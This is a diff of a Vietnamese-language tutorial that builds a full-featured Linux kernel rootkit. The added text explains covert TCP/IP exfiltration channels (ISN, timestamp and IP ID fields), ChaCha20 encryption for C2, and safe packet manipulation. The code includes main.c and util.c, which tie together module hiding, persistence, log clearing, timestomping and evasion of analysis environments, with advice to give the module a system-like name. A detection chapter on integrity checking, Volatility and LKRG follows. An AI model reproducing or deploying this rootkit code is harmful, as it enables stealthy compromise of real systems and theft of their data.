+  ┌──────────────────────────────────────────────────────────┐
+  │ Kind=0: End of options (1 byte, no length/data)         │
+  │ Kind=1: NOP padding (1 byte, no length/data)            │
+  │ Kind=2: MSS (len=4, 2 bytes MSS value)                  │
+  │ Kind=3: Window Scale (len=3, 1 byte shift count)        │
+  │ Kind=4: SACK Permitted (len=2)                          │
+  │ Kind=5: SACK blocks (variable)                          │
+  │ Kind=8: Timestamps (len=10)                             │
+  │         ┌──────┬──────┬──────────┬──────────┐           │
+  │         │Kind=8│Len=10│ TSval(32)│TSecr(32) │           │
+  │         └──────┴──────┴──────────┴──────────┘           │
+  │                                   ^^^^^^^^^^            │
+  │                        Rootkit embeds data HERE          │
+  │                        (TSecr = timestamp echo reply)   │
+  └──────────────────────────────────────────────────────────┘
+
+  Steganography Channels trong TCP:
+
+  1. ISN (Initial Sequence Number):
+     ┌────────────────────────────────────────────────────────┐
+     │ RFC yeu cau ISN "random" (chong prediction attacks)    │
+     │ Rootkit THAY THE ISN bang encoded data (4 bytes/SYN)  │
+     │ C2 server doc ISN tu received SYN packet               │
+     │ Connection co the RST ngay → giong port scan           │
+     │ Bandwidth: 4 bytes per connection attempt              │
+     └────────────────────────────────────────────────────────┘
+
+  2. TCP Timestamp (TSecr field):
+     ┌────────────────────────────────────────────────────────┐
+     │ Modify TSecr (echo reply) trong outgoing packets      │
+     │ Advantage: works on EXISTING connections (HTTP)        │
+     │ Bandwidth: 4 bytes per packet (embedded in responses)  │
+     │ Zero outbound connections needed (passive exfil)       │
+     └────────────────────────────────────────────────────────┘
+
+  3. IP Identification Field:
+     ┌────────────────────────────────────────────────────────┐
+     │ IP header "Identification" field (16 bits)             │
+     │ Used for fragment reassembly (rarely used for non-frag)│
+     │ Bandwidth: 2 bytes per packet                          │
+     └────────────────────────────────────────────────────────┘
+```
+
+#### 14.0.4 Kernel Crypto API — ChaCha20-Poly1305 AEAD
+
+Moi C2 channel nghiem tuc deu CAN encryption. Linux kernel co built-in crypto API:
+
+```
+  Kernel Crypto API Architecture:
+
+  ┌─────────────────────────────────────────────────────────────┐
+  │  crypto_alloc_aead("rfc7539(chacha20,poly1305)", 0, 0)     │
+  │     │                                                       │
+  │     ▼                                                       │
+  │  struct crypto_aead = handle (transform) cho algorithm     │
+  │     │                                                       │
+  │     ├── crypto_aead_setkey(tfm, key, 32)   Set 256-bit key │
+  │     ├── crypto_aead_setauthsize(tfm, 16)   16-byte tag     │
+  │     │                                                       │
+  │     └── Usage per message:                                  │
+  │         aead_request_alloc(tfm, GFP_KERNEL)                │
+  │         aead_request_set_crypt(req, src, dst, len, nonce)  │
+  │         crypto_aead_encrypt(req)  hoac  _decrypt(req)      │
+  │         aead_request_free(req)                              │
+  └─────────────────────────────────────────────────────────────┘
+
+  AEAD (Authenticated Encryption with Associated Data):
+  ┌─────────────────────────────────────────────────────────────┐
+  │                                                             │
+  │  Encrypt:                                                   │
+  │    Input:  plaintext + key + nonce + AAD (optional)        │
+  │    Output: ciphertext + auth_tag (16 bytes)                │
+  │                                                             │
+  │    plaintext ──┐                                           │
+  │    key ────────┤                                           │
+  │    nonce ──────┼──→ [ChaCha20-Poly1305] ──→ ciphertext     │
+  │    AAD ────────┘                          └──→ auth_tag    │
+  │                                                             │
+  │  Decrypt:                                                   │
+  │    Input:  ciphertext + auth_tag + key + nonce + AAD       │
+  │    Output: plaintext  (hoac -EBADMSG neu tag invalid)      │
+  │                                                             │
+  │    Neu tag verification FAIL → data bi tampered!           │
+  │    -EBADMSG returned, plaintext NOT output.                │
+  │                                                             │
+  └─────────────────────────────────────────────────────────────┘
+
+  ChaCha20 (Stream cipher):
+  ┌──────────────────────────────────────────────────────────┐
+  │ - XOR-based stream cipher                                │
+  │ - 256-bit key (32 bytes)                                 │
+  │ - 96-bit nonce (12 bytes) per message                    │
+  │ - Generates keystream → XOR voi plaintext                │
+  │ - KHONG can padding (khac AES-CBC)                       │
+  │ - Constant-time implementation (no timing side-channels) │
+  │ - Software-friendly (khong can AES-NI hardware)          │
+  └──────────────────────────────────────────────────────────┘
+
+  Poly1305 (MAC — Message Authentication Code):
+  ┌──────────────────────────────────────────────────────────┐
+  │ - 128-bit authentication tag (16 bytes)                  │
+  │ - One-time key derived from ChaCha20 block 0             │
+  │ - Proves: ciphertext chua bi modify                      │
+  │ - Combined: encrypt-then-MAC (standard order)            │
+  └──────────────────────────────────────────────────────────┘
+
+  Tai sao KHONG dung XOR don gian:
+  ┌──────────────────────────────────────────────────────────┐
+  │ 1. Known-plaintext attack: neu biet 1 byte plaintext    │
+  │    → biet 1 byte key → decrypt byte do o MOI message    │
+  │ 2. No authentication: attacker flip bits trong           │
+  │    ciphertext → plaintext bi thay doi (malleable)       │
+  │ 3. Nonce reuse: 2 messages cung nonce → XOR 2           │
+  │    ciphertexts = XOR 2 plaintexts → instant break       │
+  └──────────────────────────────────────────────────────────┘
+
+  Wire format (rootkit message):
+    ┌──────────┬──────────────────────┬──────────┐
+    │ Nonce    │    Ciphertext        │ Auth Tag │
+    │ 12 bytes │   (= plaintext len)  │ 16 bytes │
+    └──────────┴──────────────────────┴──────────┘
+    Total = 12 + plaintext_len + 16 = plaintext_len + 28 bytes overhead
+```
+
+#### 14.0.5 skb Manipulation Rules — CRITICAL safety
+
+Khi modify network packets trong kernel, phai tuan thu cac rules nghiem ngat de tranh kernel crash:
+
+```
+  sk_buff (Socket Buffer) Manipulation:
+
+  ┌──────────────────────────────────────────────────────────────┐
+  │ RULE 1: skb_ensure_writable() TRUOC khi modify              │
+  │                                                              │
+  │   skb co the SHARED giua nhieu users (clone, fragments).    │
+  │   skb_ensure_writable(skb, len) lam:                        │
+  │     1. Check neu skb->data la shared (skb_cloned)           │
+  │     2. Neu shared → copy data vao new buffer (COW)          │
+  │     3. Return 0 = OK, non-zero = error                     │
+  │                                                              │
+  │ RULE 2: Re-derive ALL pointers SAU ensure_writable          │
+  │                                                              │
+  │   skb_ensure_writable co the REALLOCATE skb->data.          │
+  │   Moi pointer derive TRUOC do (iph, tcph, udph) deu STALE. │
+  │                                                              │
+  │   SAI:                                                       │
+  │     iph = ip_hdr(skb);         ← derive pointer             │
+  │     skb_ensure_writable(skb);  ← co the reallocate!        │
+  │     iph->ttl = 64;            ← STALE POINTER → CRASH!     │
+  │                                                              │
+  │   DUNG:                                                      │
+  │     skb_ensure_writable(skb, len);  ← ensure writable TRUOC│
+  │     iph = ip_hdr(skb);             ← derive pointer SAU    │
+  │     tcph = tcp_hdr(skb);           ← ALL pointers fresh    │
+  │     iph->ttl = 64;                ← safe to modify         │
+  │                                                              │
+  │ RULE 3: Recalculate checksums SAU khi modify                │
+  │                                                              │
+  │   TCP checksum:                                              │
+  │     tcph->check = 0;                                        │
+  │     tcph->check = csum_tcpudp_magic(                        │
+  │       iph->saddr, iph->daddr,                               │
+  │       tcp_len, IPPROTO_TCP,                                 │
+  │       csum_partial((char *)tcph, tcp_len, 0));              │
+  │                                                              │
+  │   IP checksum:                                               │
+  │     iph->check = 0;                                         │
+  │     iph->check = ip_fast_csum((u8 *)iph, iph->ihl);        │
+  └──────────────────────────────────────────────────────────────┘
+```
+
+---
 
 ```c
 /* covert_channel.c — Covert communication channels
@@ -7223,24 +10822,277 @@ int rk_aead_decrypt(const void *input, int in_len,
 ```
 
 ---
+## Chapter 15: Tong hop --- Full-featured Rootkit
 
-## Chapter 15: Tổng hợp — Full-featured Rootkit
+### 15.0 Module Architecture --- Thiet ke rootkit production-grade
 
-### main.c — Entry point tích hợp tất cả components
+Truoc khi doc code tich hop, can hieu ARCHITECTURE DECISIONS dang sau viec
+to chuc mot kernel rootkit phuc tap. Day khong chi la "gop code lai" --- moi
+quyet dinh ordering, error handling, va cleanup deu co ly do kernel-level.
+
+#### Module initialization ordering
+
+```
+module_init(rk_init)
+  <- kernel goi ham nay SAU KHI load module vao memory.
+
+Internals: kernel's do_init_module() goi mod->init() sau khi:
+  1. Module ELF da duoc parse va relocate
+  2. Symbol dependencies da duoc resolve (EXPORT_SYMBOL)
+  3. Module struct da duoc add vao modules list
+  4. Notifier chain MODULE_STATE_COMING da fire
+
+rk_init() PHAI init theo thu tu dependency:
+  1. Symbol resolution (can truoc TAT CA)
+     <- kallsyms_lookup_name() hoac kprobe trick de tim addresses
+     <- Neu fail o day, KHONG CO GI hoat dong duoc
+     
+  2. Hooking infrastructure (can truoc hook registration)
+     <- Allocate trampolines, save original bytes/pointers
+     <- Phai xong truoc khi bat ky hook nao duoc install
+     
+  3. Hiding (can truoc C2 --- an module truoc khi mo communication)
+     <- list_del() module khoi modules list
+     <- kobject_del() xoa khoi sysfs
+     <- AN TRUOC, lam moi thu khac SAU --- vi moi operation
+        tu day tro di deu co the bi observer thay
+     
+  4. C2/Network (can hiding da active)
+     <- Netfilter hooks, magic packet handler
+     <- Luc nay module da hidden, network activity kho trace
+     
+  5. Proc interface (cuoi cung --- control plane)
+     <- /proc entry cho operator control
+     <- Cuoi cung vi: (a) dependency on all subsystems,
+        (b) operator chi can control SAU KHI moi thu da chay
+
+Neu step N fails:
+  -> cleanup steps 1..(N-1) theo thu tu NGUOC
+  -> return -EINVAL (module se bi unload boi kernel)
+  
+  Tai sao nguoc? Vi dependency chain:
+    Step 3 (hiding) co the depend on step 2 (hooks)
+    -> Phai undo step 3 TRUOC khi undo step 2
+    -> Nguoc lai se crash (use-after-free, dangling pointers)
+```
+
+#### Error handling pattern --- goto cleanup
 
 ```c
-/* main.c — PHIÊN BẢN HOÀN CHỈNH
+/*
+ * "goto cleanup" pattern --- STANDARD Linux kernel coding style.
  *
- * Tích hợp TẤT CẢ subsystems:
+ * Tai sao goto ma khong phai nested if/else?
+ * - Kernel functions thuong co 5-10 init steps
+ * - Nested if/else -> 10 levels of indentation -> unreadable
+ * - goto cleanup cho phep LINEAR success path + CLEAR error handling
+ *
+ * Documentation/process/coding-style.rst, Section 7:
+ *   "The goto statement comes in handy when a function exits
+ *    from multiple locations and some common work such as cleanup
+ *    has to be done."
+ *
+ * Moi driver, filesystem, va subsystem trong kernel deu dung pattern nay.
+ */
+
+int rk_init(void) {
+    int ret;
+    
+    ret = step1_resolve_symbols();
+    if (ret)
+        goto fail1;    /* Nothing to clean --- just exit */
+    
+    ret = step2_setup_hooks();
+    if (ret)
+        goto fail2;    /* Clean step 1 */
+    
+    ret = step3_hide_module();
+    if (ret)
+        goto fail3;    /* Clean steps 2, 1 */
+    
+    ret = step4_init_network();
+    if (ret)
+        goto fail4;    /* Clean steps 3, 2, 1 */
+    
+    ret = step5_init_proc();
+    if (ret)
+        goto fail5;    /* Clean steps 4, 3, 2, 1 */
+    
+    return 0;          /* Success --- all 5 steps done */
+
+/* Labels in REVERSE order --- each falls through to the next */
+fail5: cleanup_step4_network();
+fail4: cleanup_step3_unhide();
+fail3: cleanup_step2_unhook();
+fail2: cleanup_step1_free_symbols();
+fail1: return ret;
+}
+
+/*
+ * Tai sao fall-through hoat dong:
+ *   Neu step4 fail -> nhay den fail4
+ *   fail4 goi cleanup_step3 -> roi FALL THROUGH den fail3
+ *   fail3 goi cleanup_step2 -> roi FALL THROUGH den fail2
+ *   fail2 goi cleanup_step1 -> roi FALL THROUGH den fail1
+ *   fail1 return error code
+ *
+ * Ket qua: steps 3, 2, 1 duoc cleanup theo dung thu tu nguoc.
+ * Khong can duplicate code, khong can flag variables.
+ */
+```
+
+#### synchronize_rcu() trong module exit --- tai sao CRITICAL
+
+```
+module_exit(rk_exit)
+
+Kernel goi rk_exit() khi rmmod duoc thuc thi.
+SAU KHI rk_exit() return, kernel FREE TOAN BO module memory.
+
+rk_exit() PHAI dam bao:
+  1. Restore all hooks (put original function pointers back)
+     <- Sau buoc nay, NEW calls se di vao original handler
+     <- NHUNG: calls da bat dau TRUOC khi restore van dang chay!
+     
+  2. synchronize_rcu()  <- CRITICAL
+     
+     RCU (Read-Copy-Update) la synchronization mechanism cua kernel.
+     synchronize_rcu() BLOCKS cho den khi tat ca CPUs da di qua
+     mot "quiescent state" (context switch, idle, userspace return).
+     
+     Sau khi synchronize_rcu() return:
+       GUARANTEED rang khong con CPU nao dang execute code
+       trong module memory region.
+     
+  3. Bay gio SAFE de free module memory (rmmod returns)
+
+Khong co synchronize_rcu() --- race condition:
+
+  Timeline:
+  --------
+  CPU 0                          CPU 1
+  -----                          -----
+  rmmod: restore hook pointers
+  rmmod: rk_exit() returns
+  kernel: free module memory     syscall -> old hook entry
+    (pages unmapped)             ... still executing hook code ...
+                                 -> PAGE FAULT -> kernel panic!
+                                 
+  Day la use-after-free trong kernel space:
+    - Best case: kernel oops + crash
+    - Worst case: silent memory corruption -> data loss
+    
+  synchronize_rcu() la BARRIER:
+  
+  CPU 0                          CPU 1
+  -----                          -----
+  rmmod: restore hook pointers
+  synchronize_rcu() -> WAIT      syscall -> hook (original now)
+    |                            ... executing ...
+    |                            ... returns to userspace ...
+    |<--- quiescent state -------+
+  synchronize_rcu() returns
+  kernel: safe to free memory
+  
+Alternatives (va tai sao chung kem hon):
+  - msleep(1000): "hope no one is still in the hook"
+    -> Khong co guarantee. Co the KHONG DU tren busy system.
+    -> Co the QUA NHIEU tren idle system (waste time).
+    -> msleep is a PRAYER, not a BARRIER.
+    
+  - synchronize_rcu(): mathematically proven correct
+    -> Waits EXACTLY as long as needed
+    -> Based on kernel scheduler state, not time
+```
+
+#### Testing methodology
+
+```
+Development setup --- KHONG BAO GIO test rootkit tren host machine:
+
+  QEMU + GDB --- gold standard cho kernel dev:
+  
+    # Start VM with debug support
+    qemu-system-x86_64 \
+      -kernel vmlinuz \           # Kernel image
+      -initrd initramfs.img \     # Minimal filesystem
+      -append "console=ttyS0 nokaslr" \  # nokaslr = fixed addresses
+      -nographic \                # Console output to terminal
+      -s \                        # GDB server on :1234
+      -S                          # Freeze CPU at startup (wait for GDB)
+    
+    # In another terminal
+    gdb vmlinux                   # Kernel with debug symbols
+    (gdb) target remote :1234     # Connect to QEMU
+    (gdb) break rk_init           # Breakpoint at module init
+    (gdb) continue                # Let kernel boot
+    
+    # After insmod in VM, GDB hits breakpoint
+    (gdb) step                    # Step through rootkit code
+    (gdb) print hidden_pid_count  # Inspect variables
+    (gdb) x/10i $rip              # Disassemble current instruction
+
+  Useful kernel debug options (enable in .config):
+  
+    CONFIG_DEBUG_INFO=y
+      -> Compile with -g, generate DWARF debug info
+      -> GDB can show source code, variable names, struct layouts
+      -> ESSENTIAL cho kernel debugging
+      
+    CONFIG_KASAN=y    (Kernel Address SANitizer)
+      -> Instruments memory access at compile time
+      -> Detects: use-after-free, out-of-bounds, double-free
+      -> Overhead: ~2x memory, ~2x CPU
+      -> KASAN se bat use-after-free neu synchronize_rcu() bi thieu
+      
+    CONFIG_LOCKDEP=y  (Lock DEPendency validator)
+      -> Runtime lock ordering validation
+      -> Detects: ABBA deadlocks, lock inversion, recursive locks
+      -> Se bat loi neu add_hidden_pid() goi is_pid_hidden()
+         (recursive spinlock acquisition -> deadlock)
+      
+    CONFIG_DEBUG_LIST=y
+      -> Validates linked list operations at runtime
+      -> list_add() vao corrupted list -> immediate warning
+      -> Catches list_del() bugs in DKOM hiding
+      
+    CONFIG_FTRACE=y   (Function TRACing)
+      -> Per-function call tracing
+      -> trace-cmd record -p function -l 'sys_getdents*'
+      -> Xem CHINH XAC ham nao duoc goi, bao nhieu lan, mat bao lau
+      
+    CONFIG_PROVE_RCU=y
+      -> Validate RCU usage patterns
+      -> Detect: sleeping in RCU read-side critical section
+      -> Detect: missing rcu_read_lock/unlock pairs
+
+  Snapshot workflow:
+    1. Boot clean VM -> take snapshot "clean"
+    2. insmod rootkit -> test -> observe
+    3. Revert to "clean" snapshot
+    4. Repeat
+    
+    -> Khong bao gio bi "brick" VM
+    -> Moi test bat dau tu trang thai sach
+```
+
+---
+
+### main.c --- Entry point tich hop tat ca components
+
+```c
+/* main.c --- PHIEN BAN HOAN CHINH
+ *
+ * Tich hop TAT CA subsystems:
  *   hooks, VFS, netfilter, persistence, watchdog,
  *   anti-forensics, environment check, code integrity,
  *   /proc control interface, encrypted C2 crypto.
  *
- * Chọn hooking method tại compile time qua define:
- *   -DUSE_FTRACE    → Ftrace-based (recommended cho kernel >= 5.x)
- *   -DUSE_KPROBE    → Kprobe-based
- *   -DUSE_SYSCALL   → Syscall table (classic)
- *   Default          → Auto-detect best method
+ * Chon hooking method tai compile time qua define:
+ *   -DUSE_FTRACE    -> Ftrace-based (recommended cho kernel >= 5.x)
+ *   -DUSE_KPROBE    -> Kprobe-based
+ *   -DUSE_SYSCALL   -> Syscall table (classic)
+ *   Default          -> Auto-detect best method
  */
 
 #include "rootkit.h"
@@ -7249,8 +11101,8 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("research");
 MODULE_DESCRIPTION("Kernel Research Module");
 
-/* Tên module — đặt giống system module để blend in.
- * Ví dụ tên tốt: "kworker", "rcu_tasks", "scsi_mod",
+/* Ten module --- dat giong system module de blend in.
+ * Vi du ten tot: "kworker", "rcu_tasks", "scsi_mod",
  *                 "nf_conntrack", "overlay"
  * Avoid: "rootkit", "backdoor", "hack" */
 
@@ -7259,11 +11111,11 @@ static int __init rk_init(void)
     int err;
     bool safe;
 
-    /* 0. Environment check — VM/container/analysis tools */
+    /* 0. Environment check --- VM/container/analysis tools */
     safe = rk_environment_safe();
     if (!safe) {
-        /* Analysis tools detected — load nhưng giới hạn features.
-         * Không exit (đó là indicator). Chỉ passive mode. */
+        /* Analysis tools detected --- load nhung gioi han features.
+         * Khong exit (do la indicator). Chi passive mode. */
         pr_info("rk: passive mode (analysis environment)\n");
     }
 
@@ -7288,7 +11140,7 @@ static int __init rk_init(void)
     if (err)
         pr_warn("rk: netfilter init failed (non-fatal)\n");
 
-    /* 4. Ẩn module */
+    /* 4. An module */
     rk_hide_module();
 
     /* 5. Code integrity baseline (hash code pages) */
@@ -7298,7 +11150,7 @@ static int __init rk_init(void)
     if (safe)
         rk_start_watchdog();
 
-    /* 7. Persistence (only nếu không phải analysis environment) */
+    /* 7. Persistence (only neu khong phai analysis environment) */
     if (safe)
         rk_install_persistence();
 
@@ -7306,7 +11158,7 @@ static int __init rk_init(void)
     rk_clear_dmesg();
     rk_timestomp_rootkit_files();
 
-    /* 9. LSM hooks (optional, nếu compiled với LSM support) */
+    /* 9. LSM hooks (optional, neu compiled voi LSM support) */
 #ifdef USE_LSM
     rk_lsm_install();
 #endif
@@ -7328,7 +11180,7 @@ static int __init rk_init(void)
 
 static void __exit rk_exit(void)
 {
-    /* Cleanup ngược thứ tự init */
+    /* Cleanup nguoc thu tu init */
 
     rk_crypto_cleanup();
     rk_proc_cleanup();
@@ -7353,7 +11205,7 @@ static void __exit rk_exit(void)
     rk_remove_hooks();
 #endif
 
-    /* Synchronize: đợi in-flight handlers hoàn thành.
+    /* Synchronize: doi in-flight handlers hoan thanh.
      * synchronize_rcu() waits for all CPUs to pass through
      * a quiescent state. After return, GUARANTEED that no CPU
      * is executing in the old hook functions.
@@ -7369,13 +11221,13 @@ module_init(rk_init);
 module_exit(rk_exit);
 ```
 
-### util.c — Utility functions (deadlock-safe PID management)
+### util.c --- Utility functions (deadlock-safe PID management)
 
 ```c
-/* util.c — Shared utilities cho rootkit subsystems
+/* util.c --- Shared utilities cho rootkit subsystems
  *
  * Hidden PID management: track PIDs to hide from ps/top.
- * All functions phải thread-safe (kernel spinlock).
+ * All functions phai thread-safe (kernel spinlock).
  */
 
 #include "rootkit.h"
@@ -7407,7 +11259,7 @@ bool is_pid_hidden(pid_t pid)
 /* Add PID to hidden list.
  *
  * CRITICAL: Do NOT call is_pid_hidden() here.
- * is_pid_hidden() acquires pid_lock → calling it while
+ * is_pid_hidden() acquires pid_lock -> calling it while
  * already holding pid_lock = DEADLOCK (kernel spinlocks
  * are non-recursive). Instead, inline the duplicate check
  * directly inside the critical section. */
@@ -7418,7 +11270,7 @@ void add_hidden_pid(pid_t pid)
 
     spin_lock(&pid_lock);
 
-    /* Inline check — DON'T call is_pid_hidden (it locks too) */
+    /* Inline check --- DON'T call is_pid_hidden (it locks too) */
     for (i = 0; i < hidden_pid_count; i++) {
         if (hidden_pids[i] == pid) {
             already = true;
@@ -7449,7 +11301,7 @@ void remove_hidden_pid(pid_t pid)
 /* Accessor function cho hidden_pid_count.
  *
  * hidden_pid_count is static in util.c but /proc read handler
- * in proc_interface.c needs it. Direct access → linker error.
+ * in proc_interface.c needs it. Direct access -> linker error.
  * Accessor function: declared in rootkit.h, defined here. */
 int rk_get_hidden_pid_count(void)
 {
@@ -7461,10 +11313,10 @@ int rk_get_hidden_pid_count(void)
 }
 ```
 
-### rootkit.h — Header declarations (relevant additions)
+### rootkit.h --- Header declarations (relevant additions)
 
 ```c
-/* rootkit.h — Thêm declarations cho proc interface và crypto */
+/* rootkit.h --- Them declarations cho proc interface va crypto */
 
 /* ... (existing declarations) ... */
 
@@ -7480,7 +11332,7 @@ int  rk_aead_encrypt(const void *plaintext, int pt_len,
 int  rk_aead_decrypt(const void *input, int in_len,
                       void *plaintext, int *pt_len);
 
-/* util.c — PID management */
+/* util.c --- PID management */
 bool is_pid_hidden(pid_t pid);
 void add_hidden_pid(pid_t pid);
 void remove_hidden_pid(pid_t pid);
@@ -7511,7 +11363,7 @@ $(MODULE_NAME)-objs := main.o syscall_hooks.o ftrace_hooks.o \
 KDIR ?= /lib/modules/$(shell uname -r)/build
 PWD  := $(shell pwd)
 
-# Chọn hooking method (uncomment 1):
+# Chon hooking method (uncomment 1):
 # ccflags-y += -DUSE_FTRACE
 # ccflags-y += -DUSE_KPROBE
 # ccflags-y += -DUSE_SYSCALL
@@ -7531,15 +11383,241 @@ clean:
 
 ## Chapter 16: Detection Engineering
 
-```bash
-# ═══════════════════════════════════════════════════════════════
-# Sau khi viết rootkit, VIẾT DETECTION cho chính nó.
-# Đây là cách trở thành security researcher thực sự:
-# attack + defense = complete understanding.
-# ═══════════════════════════════════════════════════════════════
+### 16.0 Detection Theory --- Tu duy defender
 
-# ── 1. YARA Rule ──
-# Detect rootkit binary (.ko file) trên disk
+Sau khi xay dung rootkit, phai HIEU CACH DETECT chinh no.
+Day la su khac biet giua "script kiddie copy code" va "security researcher":
+  - Attacker chi can 1 technique hoat dong
+  - Defender phai detect TAT CA techniques
+  - Researcher hieu CA HAI phia
+
+#### Ba truong phai detection
+
+```
+1. INTEGRITY CHECKING --- so sanh state hien tai vs known-good baseline
+
+   Nguyen ly: rootkit PHAI modify kernel state de hoat dong.
+   Neu ta co baseline cua state "sach", moi thay doi = indicator.
+   
+   Syscall table integrity:
+     Baseline: luu dia chi cua moi syscall entry tu kallsyms khi boot
+     Runtime:  doc lai syscall table entries
+     So sanh:  entry[i] != baseline[i] -> syscall bi hook
+     
+     Chi tiet: moi entry trong sys_call_table PHAI tro vao
+     kernel text section [_stext, _etext]. Neu mot entry
+     tro ra ngoai range nay -> tro vao module memory -> HOOK.
+   
+   Function prologue integrity:
+     Baseline: save first 16 bytes cua moi critical function
+     Runtime:  doc lai first 16 bytes
+     So sanh:  bytes khac -> inline hook da duoc install
+     
+     Pattern can detect:
+       48 B8 xx xx xx xx xx xx xx xx   MOV RAX, <address>
+       FF E0                           JMP RAX
+     -> Day la trampoline cua inline hook
+   
+   Module list integrity:
+     Baseline: list_head cua modules list
+     Runtime:  walk list, count modules
+     Cross-check: scan memory cho module_struct signatures
+     So sanh:  module trong memory nhung KHONG trong list
+               -> DKOM hidden module
+
+2. BEHAVIORAL ANALYSIS --- detect hanh vi bat thuong (khong can baseline)
+
+   Nguyen ly: rootkit AN thong tin, tao INCONSISTENCY giua
+   cac nguon thong tin khac nhau trong cung mot system.
+   
+   Hidden process detection:
+     /proc listing:      PID 1234 KHONG xuat hien
+     Scheduler run queue: PID 1234 CO trong scheduler
+     -> Process exists nhung bi an khoi /proc -> rootkit
+     
+     Ky thuat: for_each_process() macro walk task_struct list
+     truc tiep, bypass getdents64 hook cua rootkit.
+   
+   Hidden network connection:
+     ss/netstat output:     connection KHONG xuat hien
+     /proc/net/tcp raw:     connection CO (neu rootkit chi hook userspace tool)
+     Kernel sock list:      connection CO (neu check truc tiep)
+     -> Connection exists nhung bi an -> rootkit
+   
+   Hidden file detection:
+     ls / readdir output:   file KHONG xuat hien
+     stat() direct:         file EXISTS (stat tra ve success)
+     Inode scan:            file CO tren disk
+     -> File exists nhung bi an khoi directory listing -> rootkit
+
+3. MEMORY FORENSICS --- offline analysis cua memory dump
+
+   Nguyen ly: rootkit AN thong tin khoi running OS,
+   nhung KHONG THE an khoi physical memory.
+   Dump memory -> analyze offline -> thay EVERYTHING.
+   
+   LiME (Linux Memory Extractor):
+     Kernel module duoc insmod vao running system
+     Doc TOAN BO physical pages (tung page frame)
+     Ghi ra file hoac gui qua network
+     
+     Luu y: LiME chinh no la mot kernel module
+     -> Rootkit co the detect va block insmod
+     -> Alternative: /dev/mem, /dev/crash, firewire DMA
+   
+   Volatility framework: analyze memory dump offline
+     Reconstruct kernel objects tu raw memory
+     Tim TAT CA objects, ke ca nhung thu bi "hidden"
+     
+     Vi sao hoat dong: rootkit chi unlink objects khoi LISTS
+     Nhung object van TON TAI trong memory
+     Volatility scan memory tim struct signatures
+     -> Tim duoc objects ma OS "khong thay"
+```
+
+#### Memory forensics voi Volatility3 --- kien truc va workflow
+
+```
+Memory acquisition pipeline:
+
+  Running System
+       |
+       v
+  LiME module insmod
+       |
+       | doc physical pages: for each PFN (Page Frame Number):
+       |   page = pfn_to_page(pfn)
+       |   content = kmap(page) -> read 4096 bytes -> kunmap
+       |   write to output
+       |
+       v
+  Raw memory file (memdump.raw)
+       |
+       v
+  Volatility3 analysis
+
+Volatility3 architecture --- 3 layers:
+
+  Layer 1: Physical Memory Layer
+    Input: raw file, ELF core, LiME format, firewire capture
+    Cung cap: read(physical_address, size) -> bytes
+    Khong biet gi ve virtual memory hay kernel objects
+    
+  Layer 2: Virtual Memory Layer (Intel AMD64 paging)
+    Su dung page tables tu Layer 1 de translate:
+      Virtual address -> Physical address
+    
+    4-level paging (x86_64):
+      PML4 (Page Map Level 4) -> 512 entries, 9 bits
+      PDPT (Page Directory Pointer Table) -> 9 bits  
+      PD   (Page Directory) -> 9 bits
+      PT   (Page Table) -> 9 bits
+      Offset -> 12 bits
+      
+      Virtual addr: [PML4][PDPT][PD][PT][Offset]
+      CR3 register -> PML4 physical address
+      
+    Volatility doc CR3 tu KPTI tables hoac idle task
+    -> Co the translate BAT KY virtual address
+    
+  Layer 3: Object Layer (kernel struct reconstruction)
+    Su dung debug symbols (DWARF / System.map) de:
+      - Biet struct layout (field offsets, sizes)
+      - Biet global variable addresses
+      - Reconstruct linked lists, trees, hash tables
+    
+    Vi du: doc modules list
+      1. Tim symbol "modules" -> dia chi cua list_head
+      2. Follow list_head.next pointers
+      3. container_of() de tim module_struct tu list_head
+      4. Doc module_struct fields: name, size, base address
+
+  Plugin workflow:
+    Plugin -> doc Layer 3 objects (structured kernel data)
+           -> so sanh voi nhung gi OS reports
+    
+    Discrepancy = rootkit indicator
+    
+    Vi du: linux.hidden_modules plugin
+      Step 1: Walk modules list (nhu OS lam) -> Set A
+      Step 2: Scan memory cho module_struct signatures -> Set B
+      Step 3: B - A = hidden modules
+      
+      Rootkit dung list_del() chi remove khoi list (Step 1)
+      Nhung module_struct van nam trong memory (Step 2 tim thay)
+```
+
+#### LKRG (Linux Kernel Runtime Guard) --- runtime defense
+
+```
+LKRG la kernel module hoat dong nhu "immune system" cua kernel.
+Thay vi scan tu ben ngoai (nhu Volatility), LKRG MONITOR tu ben trong,
+TRONG KHI SYSTEM DANG CHAY.
+
+LKRG monitors (lien tuc tai runtime):
+
+  1. Syscall table integrity
+     - Periodic hash check cua toan bo sys_call_table
+     - Luu hash khi LKRG load (baseline)
+     - Timer fires -> recompute hash -> compare
+     - Mismatch -> ALERT: syscall table da bi modify
+     
+  2. IDT (Interrupt Descriptor Table) integrity
+     - IDT chua handlers cho interrupts va exceptions
+     - Rootkit co the hook interrupt handlers
+     - LKRG hash IDT entries -> periodic verify
+     
+  3. Kernel text section integrity
+     - .text section chua compiled kernel code
+     - Inline hooks MODIFY bytes trong .text
+     - LKRG hash kernel text pages -> detect modification
+     - Luu y: kernel co "text_poke" cho legitimate patching
+       LKRG phai distinguish legitimate vs malicious changes
+     
+  4. Module list integrity
+     - Monitor modules list cho unauthorized changes
+     - Detect: module bi remove khoi list nhung van trong memory
+     - Cross-reference voi memory layout
+     
+  5. Credentials integrity
+     - Hook security-sensitive functions (commit_creds, etc.)
+     - Monitor task_struct->cred cho unauthorized changes
+     - Detect: uid suddenly thay doi tu 1000 -> 0
+       ma KHONG thong qua legitimate path (su_do, setuid)
+     -> Nay detect privilege escalation rootkit!
+     
+  6. SELinux/capability integrity
+     - Monitor security context changes
+     - Detect bypass cua mandatory access control
+
+  LKRG response options:
+    - Log only (detection mode)
+    - Kill offending process
+    - Kernel panic (nuclear option --- prevent further damage)
+
+  Rootkit vs LKRG --- attacker phai:
+    1. Hook syscalls MA KHONG modify sys_call_table (dung ftrace/kprobe)
+    2. Hide module MA KHONG break LKRG's module monitoring
+    3. Escalate privileges MA KHONG trigger credential monitoring
+    4. Modify kernel code MA KHONG trigger text integrity check
+    5. Lam TAT CA dieu tren DONG THOI
+    
+    -> Do kho tang DRAMATICALLY khi LKRG active
+    -> Day la ly do defense-in-depth hoat dong:
+       moi layer KHONG CAN perfect, chi can TANG COST cho attacker
+```
+
+---
+
+```bash
+# ===============================================================
+# Sau khi viet rootkit, VIET DETECTION cho chinh no.
+# Day la cach tro thanh security researcher thuc su:
+# attack + defense = complete understanding.
+# ===============================================================
+
+# -- 1. YARA Rule --
+# Detect rootkit binary (.ko file) tren disk
 
 cat > rootkit_detector.yar << 'YARA'
